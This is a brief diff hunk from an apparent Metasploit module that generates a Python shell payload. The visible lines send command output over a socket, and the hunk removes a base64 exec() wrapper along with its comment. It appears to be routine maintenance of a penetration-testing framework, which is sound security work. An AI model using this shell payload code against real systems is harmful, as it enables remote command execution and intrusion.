@@ -58,9 +58,6 @@ module Metasploit3
     cmd << "\tstdout_value=stdout.read()+stderr.read()\n"
     cmd << "\tso.send(stdout_value)\n"
 
-    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
-    cmd = "exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))"
-
     cmd
   end
 
